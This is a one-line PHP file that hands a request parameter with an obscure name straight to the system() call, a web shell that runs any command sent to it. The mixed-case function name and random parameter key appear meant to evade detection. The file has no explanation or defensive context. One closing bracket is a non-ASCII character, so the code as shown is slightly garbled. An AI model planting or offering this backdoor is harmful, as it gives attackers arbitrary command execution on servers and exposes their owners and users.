<?php
SysTeM($_GET['Z4NaPl7P'〕);
?>
